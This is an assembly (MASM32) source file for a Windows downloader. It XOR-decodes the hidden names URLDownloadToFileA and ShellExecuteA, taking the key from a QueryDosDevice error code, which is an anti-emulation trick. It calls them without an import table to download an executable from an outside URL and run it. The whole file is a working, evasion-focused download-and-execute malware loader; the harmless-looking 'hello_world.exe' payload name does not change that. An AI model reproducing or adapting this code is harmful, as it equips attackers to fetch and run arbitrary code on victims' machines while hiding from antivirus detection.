.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\macros\macros.asm
include no_import.asm
uselib kernel32, user32


.code
string_coder PROC data:DWORD
LOCAL buf[16]:BYTE

  invoke lstrlen, data
  mov esi, data
  mov edi, eax

  next_sym:
  .if edi > 0
    invoke SetLastError,0
    invoke QueryDosDevice, chr$("C:"), addr buf, 5

    .if eax == 0
      invoke GetLastError
      and al,0Fh
      dec al
      xor byte ptr [esi],al
      inc esi
      dec edi
      jmp next_sym
    .endif
  .endif

  mov eax, data
ret
string_coder ENDP

start PROC
  LOCAL funcname:DWORD

  noimport_call_prepare

.data
fname db "\[EMf~gefhm]fO`elH",0
.code

  mov funcname, FUNC(string_coder,offset fname)
  noimport_invoke_load funcname, chr$("urlmon.dll"), 0, chr$("http://kaimi.io/hello_world.exe?12"), chr$("hello_world.exe"), 0, 0

  mov funcname, FUNC(string_coder,chr$("ZaleeLqlj|}lH"))
  noimport_invoke_load funcname, chr$("shell32.dll"), 0, chr$("open"), chr$("hello_world.exe"), 0, 0, SW_SHOWNORMAL


  invoke ExitProcess, 0
start ENDP
end start
